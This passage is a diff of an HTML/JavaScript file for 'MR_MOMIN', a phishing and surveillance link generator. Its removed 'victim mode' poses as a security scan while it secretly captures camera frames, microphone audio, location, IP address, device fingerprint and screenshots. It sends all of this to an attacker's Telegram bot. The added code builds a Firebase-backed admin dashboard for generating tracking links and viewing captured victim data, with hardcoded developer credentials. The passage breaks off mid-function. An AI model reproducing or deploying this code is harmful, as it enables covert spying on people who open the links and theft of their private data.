@@ -3,585 +3,659 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MR_MOMIN_🌍 | প্রিমিয়াম এক্সপ্লয়েট</title>
-    <!-- html2canvas for screenshot -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <title>ELITE ADMIN | MR_MOMIN_🌍</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <!-- Leaflet for maps -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            font-family: 'Courier New', 'Fira Code', monospace;
         }
         body {
-            background: radial-gradient(circle at 10% 20%, #0a0f1e, #010101);
+            background: radial-gradient(circle at 20% 30%, #03000a, #000000);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 1rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.1;
         }
         .glass-card {
-            background: rgba(10, 20, 30, 0.7);
-            backdrop-filter: blur(16px);
+            background: rgba(0, 10, 20, 0.85);
+            backdrop-filter: blur(12px);
             border-radius: 2rem;
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            max-width: 550px;
+            border: 1px solid #ffd700;
+            max-width: 1100px;
             width: 100%;
-            padding: 2rem 1.5rem;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 255, 255, 0.2);
-            transition: all 0.3s ease;
+            padding: 2rem;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+            position: relative;
+            z-index: 2;
         }
         h1 {
-            font-size: 2rem;
+            font-size: 1.8rem;
             text-align: center;
-            background: linear-gradient(135deg, #aaffff, #00ccff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 0.25rem;
+            color: #ffd700;
+            text-shadow: 0 0 5px #ffd700;
+            letter-spacing: 2px;
         }
         .tagline {
             text-align: center;
-            color: #7ab3c8;
+            color: #0ef;
             font-size: 0.7rem;
-            margin-bottom: 1.5rem;
-            border-bottom: 1px dashed #2a5f73;
+            border-bottom: 1px solid #ffd700;
             display: inline-block;
             width: auto;
             padding-bottom: 5px;
+            margin-bottom: 1.5rem;
         }
         .input-group {
-            margin-bottom: 1.2rem;
+            margin-bottom: 1rem;
         }
         label {
             display: block;
-            font-size: 0.8rem;
-            font-weight: 600;
-            color: #bbddff;
-            margin-bottom: 6px;
+            font-size: 0.7rem;
+            color: #0ef;
+            margin-bottom: 4px;
         }
-        input {
+        input, select {
             width: 100%;
-            background: #0f1922;
-            border: 1px solid #2f5b6e;
-            border-radius: 1.2rem;
-            padding: 12px 18px;
-            color: #f0f9ff;
-            font-size: 0.9rem;
+            background: #001000;
+            border: 1px solid #ffd700;
+            border-radius: 1rem;
+            padding: 12px;
+            color: #0ef;
+            font-size: 0.8rem;
             outline: none;
-        }
-        input:focus {
-            border-color: #0ef;
-            box-shadow: 0 0 10px rgba(0, 238, 255, 0.3);
         }
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: repeat(2,1fr);
             gap: 12px;
-            margin: 1.8rem 0;
+            margin: 1.5rem 0;
         }
         .feature-card {
-            background: #0c1822;
-            border: 1px solid #2a5b6e;
-            border-radius: 1.2rem;
-            padding: 12px 6px;
+            background: #001500;
+            border: 1px solid #ffd700;
+            border-radius: 1rem;
+            padding: 8px;
             text-align: center;
             cursor: pointer;
+            font-size: 0.8rem;
+            color: #0ef;
             transition: 0.2s;
-            font-weight: 500;
-            font-size: 0.85rem;
-            color: #cae9ff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
         }
         .feature-card.selected {
-            background: rgba(0, 200, 255, 0.2);
-            border-color: #0ef;
-            box-shadow: 0 0 12px #0ef4;
-            color: white;
-        }
-        .feature-card span {
-            font-size: 1.3rem;
+            background: rgba(255,215,0,0.2);
+            box-shadow: 0 0 12px #ffd700;
+            border-color: #fff;
         }
         .btn {
             width: 100%;
-            background: linear-gradient(95deg, #0d8ba8, #006b86);
+            background: linear-gradient(95deg, #ffd700, #ffaa00);
             border: none;
             border-radius: 2rem;
-            padding: 14px;
+            padding: 12px;
             font-weight: bold;
-            font-size: 1rem;
-            color: white;
+            color: black;
             cursor: pointer;
-            transition: 0.2s;
             margin-top: 10px;
+            transition: 0.2s;
         }
-        .btn:active {
-            transform: scale(0.97);
-        }
+        .btn:active { transform: scale(0.97); }
         .link-box {
-            margin-top: 1.8rem;
-            background: #00000066;
-            border-radius: 1.2rem;
-            padding: 14px;
+            margin-top: 1.5rem;
+            background: #000000aa;
+            border-radius: 1rem;
+            padding: 12px;
             display: none;
-            border-left: 4px solid #0ef;
+            border-left: 3px solid #ffd700;
         }
         .link-text {
-            font-family: monospace;
-            font-size: 0.75rem;
-            word-break: break-all;
-            background: #09131e;
-            padding: 10px;
-            border-radius: 1rem;
-            margin-bottom: 12px;
-            color: #b7e4ff;
-        }
-        .copy-row {
-            display: flex;
-            gap: 12px;
-            margin-top: 8px;
-        }
-        .copy-row button {
-            flex: 1;
-            background: #1f3e4c;
-            border: none;
-            border-radius: 2rem;
-            padding: 8px;
             font-size: 0.7rem;
-            color: #e0f2ff;
-            cursor: pointer;
+            word-break: break-all;
+            background: #021a02;
+            padding: 8px;
+            border-radius: 0.5rem;
+            color: #afa;
+            margin-bottom: 8px;
         }
         .short-toggle {
             display: flex;
             align-items: center;
-            justify-content: flex-start;
-            gap: 12px;
-            margin: 15px 0 10px;
-            background: #0a121c;
-            padding: 10px;
+            gap: 8px;
+            margin: 12px 0;
+            background: #001000;
+            padding: 8px;
             border-radius: 2rem;
         }
-        .short-toggle label {
-            margin: 0;
-            cursor: pointer;
-            color: #bbddff;
-        }
-        .short-toggle input {
-            width: auto;
-            margin-right: 8px;
-        }
+        .short-toggle label { margin: 0; cursor: pointer; color: #0ef; }
         .info-note {
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             text-align: center;
             margin-top: 20px;
-            color: #3f7e8c;
+            color: #ffd700;
         }
-
-        /* ভিকটিম পেজের স্টাইল (নিরীহ, কোনো বাটন নেই) */
-        .victim-card {
-            background: white;
-            border-radius: 1.5rem;
-            max-width: 400px;
-            width: 100%;
-            padding: 2rem 1.5rem;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        /* admin tables & cards */
+        .link-card {
+            background: #001500;
+            border: 1px solid #ffd700;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin: 1rem 0;
+            cursor: pointer;
+            transition: 0.2s;
         }
-        .victim-card h2 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: #1e2a3e;
+        .link-card:hover {
+            background: #002a00;
         }
-        .victim-card p {
-            color: #4a5568;
+        .data-card {
+            background: #001500;
+            border: 1px solid #ffd700;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin: 1rem 0;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        .flex-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
             margin-bottom: 1rem;
         }
-        .loader {
+        .small-btn {
+            background: #ffd700;
+            color: black;
+            border: none;
+            border-radius: 1rem;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-size: 0.7rem;
+        }
+        .stat-badge {
             display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #e2e8f0;
-            border-top-color: #0d8ba8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
+            background: #ffd70033;
+            padding: 2px 8px;
+            border-radius: 1rem;
+            font-size: 0.7rem;
+            margin-right: 10px;
+            color: #ffd700;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .tab-content { display: block; }
+        .hide { display: none; }
+        #map { height: 300px; width: 100%; border-radius: 1rem; margin-top: 1rem; }
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            color: #0ef;
         }
-        .hide {
-            display: none;
+        .admin-table th, .admin-table td {
+            border: 1px solid #ffd700;
+            padding: 8px;
+            font-size: 0.7rem;
         }
     </style>
 </head>
 <body>
+<div id="matrixCanvas" class="matrix-bg"></div>
+
 <div id="appRoot">
-    <!-- জেনারেটর প্যানেল (শুধু প্রশাসক) -->
-    <div id="generatorPanel" class="glass-card">
-        <h1>MR_MOMIN_🌍</h1>
-        <div style="text-align:center;"><span class="tagline">⚡ প্রিমিয়াম এক্সপ্লয়েট ফ্রেমওয়ার্ক</span></div>
-
+    <!-- LOGIN VIEW -->
+    <div id="loginView" class="glass-card">
+        <h1>> MR_MOMIN_🌍 ADMIN_</h1>
+        <div style="text-align:center;"><span class="tagline">[ ELITE CONTROL PANEL ]</span></div>
         <div class="input-group">
-            <label>🤖 টেলিগ্রাম বট টোকেন</label>
-            <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrs">
+            <label>👤 USER ID / UID</label>
+            <input type="text" id="loginUid" placeholder="admin_uid">
         </div>
         <div class="input-group">
-            <label>💬 চ্যাট আইডি</label>
-            <input type="text" id="chatId" placeholder="-1001234567890 বা 123456789">
+            <label>🔑 PASSWORD</label>
+            <input type="password" id="loginPwd" placeholder="******">
         </div>
-
-        <div class="feature-grid" id="featureGrid">
-            <div class="feature-card" data-feat="C"><span>📸</span> ক্যামেরা</div>
-            <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন</div>
-            <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
-            <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
-        </div>
-
-        <div class="short-toggle">
-            <input type="checkbox" id="shortenCheckbox"> 
-            <label for="shortenCheckbox">🔗 শর্ট লিংক তৈরি করুন (is.gd)</label>
-        </div>
-
-        <button class="btn" id="generateLinkBtn">✨ লিংক জেনারেট করুন</button>
-
-        <div id="linkResultBox" class="link-box">
-            <div class="link-text" id="generatedLink">আপনার লিংক এখানে</div>
-            <div class="copy-row">
-                <button id="copyFullBtn">📋 লিংক কপি করুন</button>
-            </div>
-        </div>
-        <div class="info-note">🔒 লিংকটি কপি করে শেয়ার করুন। ভিকটিম ওপেন করলেই স্বয়ংক্রিয়ভাবে সব তথ্য টেলিগ্রামে চলে আসবে।</div>
+        <button class="btn" id="loginBtn">⚡ LOGIN</button>
+        <div class="info-note">Developer: use UID = "dev_master" and password = "MR_MOMIN_🌍"</div>
     </div>
 
-    <!-- ভিকটিম প্যানেল (কোনো বাটন নেই, লোড হতেই শুরু) -->
-    <div id="victimPanel" class="victim-card hide">
-        <h2>🛡️ নিরাপত্তা যাচাই</h2>
-        <p>আপনার ডিভাইস স্ক্যান করা হচ্ছে, দয়া করে অপেক্ষা করুন...</p>
-        <div class="loader"></div>
-        <p style="font-size:0.75rem; color:#718096;">এতে কয়েক সেকেন্ড সময় লাগতে পারে</p>
+    <!-- ADMIN DASHBOARD -->
+    <div id="dashboardView" class="glass-card hide">
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+            <h1>> WELCOME, <span id="welcomeUser">ADMIN</span>_</h1>
+            <button id="logoutBtn" class="small-btn">LOGOUT</button>
+        </div>
+        <div style="text-align:center;"><span class="tagline">[ LIVE TRACKING SUITE ]</span></div>
+
+        <!-- TABS -->
+        <div class="flex-row" style="margin-bottom: 1rem;">
+            <button id="tabGenBtn" class="small-btn" style="background:#ffd700;">🔗 GENERATOR</button>
+            <button id="tabMonitorBtn" class="small-btn">📡 MONITOR</button>
+            <button id="tabDataViewBtn" class="small-btn">📦 DATA VIEWER</button>
+            <button id="tabAdminMgmtBtn" class="small-btn hide">👥 ADMIN MGMT</button>
+        </div>
+
+        <!-- GENERATOR TAB -->
+        <div id="tabGenerator" class="tab-content">
+            <div class="feature-grid" id="featureGrid">
+                <div class="feature-card" data-feat="C"><span>📸</span> CAMERA (3fps)</div>
+                <div class="feature-card" data-feat="M"><span>🎙️</span> MIC (10s loop)</div>
+                <div class="feature-card" data-feat="L"><span>📍</span> LOCATION</div>
+                <div class="feature-card" data-feat="X"><span>💻</span> DEVICE INFO</div>
+            </div>
+            <div class="short-toggle">
+                <input type="checkbox" id="shortenCheckbox"> <label>🔗 SHORTEN LINK (is.gd)</label>
+            </div>
+            <button class="btn" id="generateLinkBtn">⚡ GENERATE LINK</button>
+            <div id="linkResultBox" class="link-box">
+                <div class="link-text" id="generatedLink">--</div>
+                <div class="copy-row" style="display:flex; gap:8px;">
+                    <button id="copyFullBtn" style="background:#ffd700; color:#000; border:none; border-radius:1rem; padding:6px; flex:1;">COPY LINK</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- MONITOR TAB: list of links with live counters -->
+        <div id="tabMonitor" class="tab-content hide">
+            <h3 style="color:#ffd700;">📡 YOUR TRACKING LINKS</h3>
+            <div id="linksList"></div>
+        </div>
+
+        <!-- DATA VIEWER TAB: click on a link to see details + map -->
+        <div id="tabDataView" class="tab-content hide">
+            <h3 style="color:#ffd700;">📦 CLICK ON A LINK TO VIEW CAPTURED DATA</h3>
+            <div id="dataLinksList"></div>
+            <div id="dataDetails" class="hide">
+                <h4>Data for <span id="selectedLinkId"></span></h4>
+                <div id="map" style="height:300px;"></div>
+                <div id="mediaList" class="data-card"></div>
+            </div>
+        </div>
+
+        <!-- ADMIN MANAGEMENT TAB (only developer) -->
+        <div id="tabAdminMgmt" class="tab-content hide">
+            <h3 style="color:#ffd700;">👥 ADMIN MANAGEMENT</h3>
+            <div class="flex-row" style="margin-bottom: 1rem;">
+                <input type="text" id="newAdminUid" placeholder="new admin UID" style="flex:1;">
+                <input type="password" id="newAdminPwd" placeholder="password" style="flex:1;">
+                <button id="createAdminBtn" class="small-btn">CREATE</button>
+            </div>
+            <div id="adminsTableContainer"></div>
+        </div>
     </div>
 </div>
 
-<!-- গোপন ভিডিও/অডিও এলিমেন্ট -->
-<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
-<canvas id="hiddenCanvas" style="display:none;"></canvas>
-
 <script>
-    // ===================== বেস ইউআরএল ফাংশন =====================
-    function getBaseUrl() {
-        let fullUrl = window.location.href;
-        let base = fullUrl.split('?')[0];
-        if (base.startsWith('about:') || base === 'null' || base === '') {
-            let origin = window.location.origin;
-            let pathname = window.location.pathname;
-            if (origin && origin !== 'null') base = origin + pathname;
-            else base = 'index.html';
+    // ========== FIREBASE CONFIG ==========
+    const firebaseConfig = {
+        apiKey: "AIzaSyCiAEFoHUdaaJNJr0PnweGOZ-N7zi438c0",
+        authDomain: "momin-tracking-sysrem.firebaseapp.com",
+        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com/",
+        projectId: "momin-tracking-sysrem",
+        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
+        messagingSenderId: "637134050647",
+        appId: "1:637134050647:web:86c90c894a13be2fd75a12"
+    };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
+
+    // ========== MATRIX BACKGROUND ==========
+    (function matrixRain() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        document.getElementById('matrixCanvas').appendChild(canvas);
+        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for(let i=0; i<columns; i++) drops[i] = 1;
+        function draw() {
+            ctx.fillStyle = 'rgba(0,0,0,0.04)';
+            ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            for(let i=0; i<drops.length; i++) {
+                const text = chars[Math.floor(Math.random()*chars.length)];
+                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
+                drops[i]++;
+            }
         }
-        if (base.endsWith('/')) base = base.slice(0, -1);
-        return base;
-    }
+        setInterval(draw, 50);
+        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+    })();
 
-    // ইউআরএল প্যারামিটার চেক
-    const urlParams = new URLSearchParams(window.location.search);
-    const tokenParam = urlParams.get('t');
-    const chatParam = urlParams.get('c');
-    const featParam = urlParams.get('f') || '';
+    // ========== GLOBALS ==========
+    let currentUser = null; // { uid, type: 'admin' or 'developer' }
+    let currentAdminId = null;
 
-    if (tokenParam && chatParam) {
-        // ভিকটিম মোড – কোনো বাটন ছাড়াই শুরু
-        document.getElementById('generatorPanel').classList.add('hide');
-        document.getElementById('victimPanel').classList.remove('hide');
-        startVictimAuto(tokenParam, chatParam, featParam);
-    } else {
+    // ========== LOGIN ==========
+    document.getElementById('loginBtn').onclick = async () => {
+        const uid = document.getElementById('loginUid').value.trim();
+        const pwd = document.getElementById('loginPwd').value.trim();
+        if (!uid || !pwd) { alert("Enter UID and Password"); return; }
+
+        if (uid === "dev_master" && pwd === "MR_MOMIN_🌍") {
+            currentUser = { uid: "dev_master", type: "developer" };
+            currentAdminId = null;
+            showDashboard();
+            return;
+        }
+
+        const adminRef = db.ref(`admins/${uid}`);
+        const snapshot = await adminRef.once('value');
+        const admin = snapshot.val();
+        if (admin && admin.password === pwd) {
+            currentUser = { uid: uid, type: "admin", name: admin.name || uid };
+            currentAdminId = uid;
+            showDashboard();
+        } else {
+            alert("Invalid credentials");
+        }
+    };
+
+    function showDashboard() {
+        document.getElementById('loginView').classList.add('hide');
+        document.getElementById('dashboardView').classList.remove('hide');
+        document.getElementById('welcomeUser').innerText = currentUser.type === 'developer' ? 'DEVELOPER' : currentUser.uid;
+        if (currentUser.type === 'developer') {
+            document.getElementById('tabAdminMgmtBtn').classList.remove('hide');
+            loadAllAdmins();
+        } else {
+            document.getElementById('tabAdminMgmtBtn').classList.add('hide');
+        }
+        setupTabs();
         setupGenerator();
+        if (currentUser.type === 'admin') {
+            loadMonitorLinks();
+            loadDataLinks();
+        }
     }
 
-    // ===================== জেনারেটর =====================
-    function setupGenerator() {
-        const featureDivs = document.querySelectorAll('.feature-card');
-        let selectedFeatures = new Set();
+    function setupTabs() {
+        const tabs = {
+            gen: document.getElementById('tabGenBtn'),
+            mon: document.getElementById('tabMonitorBtn'),
+            data: document.getElementById('tabDataViewBtn'),
+            mgmt: document.getElementById('tabAdminMgmtBtn')
+        };
+        const contents = {
+            gen: document.getElementById('tabGenerator'),
+            mon: document.getElementById('tabMonitor'),
+            data: document.getElementById('tabDataView'),
+            mgmt: document.getElementById('tabAdminMgmt')
+        };
+        const showTab = (name) => {
+            for (let k in contents) contents[k].classList.add('hide');
+            contents[name].classList.remove('hide');
+        };
+        tabs.gen.onclick = () => showTab('gen');
+        tabs.mon.onclick = () => showTab('mon');
+        tabs.data.onclick = () => showTab('data');
+        if (tabs.mgmt) tabs.mgmt.onclick = () => showTab('mgmt');
+        showTab('gen');
+    }
 
-        featureDivs.forEach(div => {
+    // ========== LINK GENERATOR ==========
+    function setupGenerator() {
+        const featDivs = document.querySelectorAll('.feature-card');
+        let selected = new Set();
+        featDivs.forEach(div => {
             div.addEventListener('click', () => {
-                const feat = div.getAttribute('data-feat');
-                if (selectedFeatures.has(feat)) {
-                    selectedFeatures.delete(feat);
-                    div.classList.remove('selected');
-                } else {
-                    selectedFeatures.add(feat);
-                    div.classList.add('selected');
-                }
+                const f = div.getAttribute('data-feat');
+                if (selected.has(f)) { selected.delete(f); div.classList.remove('selected'); }
+                else { selected.add(f); div.classList.add('selected'); }
             });
         });
-
         const genBtn = document.getElementById('generateLinkBtn');
         const linkBox = document.getElementById('linkResultBox');
         const linkSpan = document.getElementById('generatedLink');
-        const shortenCheck = document.getElementById('shortenCheckbox');
-        let fullLink = '', shortLink = '';
-
-        genBtn.addEventListener('click', async () => {
-            const token = document.getElementById('botToken').value.trim();
-            const chatId = document.getElementById('chatId').value.trim();
-            if (!token || !chatId) {
-                alert('⚠️ বট টোকেন এবং চ্যাট আইডি দিন!');
-                return;
-            }
-            if (selectedFeatures.size === 0) {
-                alert('⚠️ অন্তত একটি ফিচার নির্বাচন করুন!');
-                return;
-            }
-            const features = Array.from(selectedFeatures).join('');
-            const baseUrl = getBaseUrl();
-            fullLink = `${baseUrl}?t=${encodeURIComponent(token)}&c=${encodeURIComponent(chatId)}&f=${features}`;
-
-            if (shortenCheck.checked) {
-                linkSpan.innerText = '⏳ শর্ট লিংক তৈরি হচ্ছে...';
+        const shortCheck = document.getElementById('shortenCheckbox');
+        genBtn.onclick = async () => {
+            if (selected.size === 0) { alert("Select at least one feature"); return; }
+            const features = Array.from(selected).join('');
+            const linkId = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'track.html');
+            const fullLink = `${baseUrl}?id=${linkId}&f=${features}`;
+            const linkData = {
+                linkId: linkId,
+                features: features,
+                createdAt: Date.now(),
+                createdBy: currentAdminId || currentUser.uid,
+                shortUrl: null
+            };
+            if (shortCheck.checked) {
+                linkSpan.innerText = 'SHORTENING...';
                 try {
                     const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
                     const data = await res.json();
-                    shortLink = data.shorturl || fullLink;
-                    linkSpan.innerText = shortLink;
-                } catch(e) {
-                    linkSpan.innerText = fullLink;
-                }
+                    const short = data.shorturl || fullLink;
+                    linkData.shortUrl = short;
+                    linkSpan.innerText = short;
+                } catch(e) { linkSpan.innerText = fullLink; }
             } else {
                 linkSpan.innerText = fullLink;
             }
+            await db.ref(`links/${currentAdminId || 'dev'}/${linkId}`).set(linkData);
             linkBox.style.display = 'block';
-        });
-
+            if (currentUser.type === 'admin') loadMonitorLinks();
+        };
         document.getElementById('copyFullBtn').onclick = () => {
-            const currentLink = linkSpan.innerText;
-            if (currentLink && currentLink !== 'আপনার লিংক এখানে' && !currentLink.includes('⏳')) {
-                copyToClipboard(currentLink, '✅ লিংক কপি হয়েছে!');
-            } else {
-                alert('প্রথমে লিংক জেনারেট করুন');
-            }
+            const txt = linkSpan.innerText;
+            if (txt && txt !== '--' && !txt.includes('SHORTENING')) copyClip(txt);
+            else alert("Generate link first");
         };
     }
+    function copyClip(t) { navigator.clipboard.writeText(t).then(() => alert("Link copied")); }
 
-    function copyToClipboard(text, msg) {
-        navigator.clipboard.writeText(text).then(() => alert(msg));
-    }
-
-    // ===================== ভিকটিম মোড – সম্পূর্ণ স্বয়ংক্রিয়, কোনো বাটন নেই =====================
-    async function startVictimAuto(token, chatId, features) {
-        // টেলিগ্রাম হেল্পার (সব মেসেজে ডেভেলপার ট্যাগ)
-        const devTag = "\n\n_🧨 Developed by MR_MOMIN_🌍_";
-
-        async function sendText(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text + devTag, parse_mode: 'Markdown' })
-                });
-            } catch(e) { console.error(e); }
-        }
-
-        async function sendPhoto(blob) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('photo', blob, 'spy.jpg');
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        async function sendVoice(blob) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('voice', blob, 'audio.ogg');
-            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
-        }
-
-        // ----- 1. ডিভাইস তথ্য (যদি সিলেক্ট করা থাকে) -----
-        if (features.includes('X')) {
-            try {
-                let ip = 'অজানা';
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-            } catch(e) {}
-            let battery = 'N/A';
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level*100)}% (${b.charging ? 'চার্জিং' : 'চার্জিং না'})`;
-            }
-            const info = `📱 *ডিভাইস তথ্য*\nআইপি: \`${ip}\`\nব্যাটারি: ${battery}\nপ্ল্যাটফর্ম: ${navigator.platform}\nভাষা: ${navigator.language}\nস্ক্রিন: ${screen.width}x${screen.height}\nসময়: ${new Date().toLocaleString('bn-BD')}`;
-            await sendText(info);
-        }
-
-        // ----- 2. লোকেশন (যদি সিলেক্ট করা থাকে) -----
-        if (features.includes('L')) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const maps = `https://maps.google.com/?q=${lat},${lon}`;
-                    await sendText(`📍 *লোকেশন*\nঅক্ষাংশ: ${lat}\nদ্রাঘিমাংশ: ${lon}\n[মানচিত্রে দেখুন](${maps})`);
-                }, async (err) => {
-                    await sendText(`❌ লোকেশন ত্রুটি: ${err.message}`);
-                });
-            } else {
-                await sendText('❌ এই ব্রাউজার লোকেশন সাপোর্ট করে না');
-            }
-        }
-
-        // ----- 3. ক্যামেরা (যদি সিলেক্ট করা থাকে, প্রতি সেকেন্ডে ৩টি ছবি) -----
-        let cameraInterval = null;
-        if (features.includes('C')) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.getElementById('hiddenCanvas');
-                const capture = () => {
-                    if (video.videoWidth && video.videoHeight) {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.7);
-                    }
-                };
-                capture(); // first shot
-                cameraInterval = setInterval(capture, 333); // 333ms = 3 per second
-            } catch (err) {
-                await sendText(`❌ ক্যামেরা ত্রুটি: ${err.message}`);
-            }
-        }
-
-        // ----- 4. মাইক্রোফোন (যদি সিলেক্ট করা থাকে, ৬ সেকেন্ড রেকর্ড) -----
-        if (features.includes('M')) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const audioPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg' });
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(blob);
-                    };
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 6000);
-                const audioBlob = await audioPromise;
-                await sendVoice(audioBlob);
-            } catch (err) {
-                await sendText(`❌ মাইক্রোফোন ত্রুটি: ${err.message}`);
-            }
-        }
-
-        // ========== অতিরিক্ত গোপন তথ্য (সব সময় চালু) ==========
-        // ব্যাটারি রিয়েল-টাইম
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            const sendBattery = () => {
-                sendText(`🔋 *ব্যাটারি আপডেট*\nলেভেল: ${Math.round(battery.level*100)}%\nস্ট্যাটাস: ${battery.charging ? 'চার্জিং' : 'চার্জিং না'}`);
-            };
-            sendBattery();
-            battery.addEventListener('levelchange', sendBattery);
-            battery.addEventListener('chargingchange', sendBattery);
-        }
-
-        // নেটওয়ার্ক তথ্য
-        let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        let netInfo = `🌐 *নেটওয়ার্ক তথ্য*\nআইপি: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'অজানা')}\n`;
-        if (connection) {
-            netInfo += `টাইপ: ${connection.effectiveType || 'N/A'}\nডাউনলিংক: ${connection.downlink || 'N/A'} Mbps\nRTT: ${connection.rtt || 'N/A'} ms`;
-        } else {
-            netInfo += `কানেকশন API উপলব্ধ নয়।`;
-        }
-        await sendText(netInfo);
-
-        // ব্রাউজার ফিঙ্গারপ্রিন্ট
-        const canvasFp = document.createElement('canvas');
-        canvasFp.width = 200;
-        canvasFp.height = 50;
-        const ctx = canvasFp.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 100, 50);
-        ctx.fillStyle = '#069';
-        ctx.fillText('MR_MOMIN', 2, 15);
-        const fp = canvasFp.toDataURL();
-        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
-        const fingerprintData = `🕵️ *ব্রাউজার ফিঙ্গারপ্রিন্ট*\n- ক্যানভাস হ্যাশ: ${fp.substring(0, 50)}...\n- প্লাগইন: ${plugins}\n- ইউজার এজেন্ট: ${navigator.userAgent}\n- ভাষা: ${navigator.language}\n- কোরস: ${navigator.hardwareConcurrency || 'N/A'} cores\n- মেমরি: ${navigator.deviceMemory || 'N/A'} GB`;
-        await sendText(fingerprintData);
-
-        // স্ক্রিনশট
-        try {
-            const screenshotCanvas = await html2canvas(document.body, { scale: 0.8, logging: false });
-            const blob = await new Promise(resolve => screenshotCanvas.toBlob(resolve, 'image/jpeg', 0.7));
-            await sendPhoto(blob);
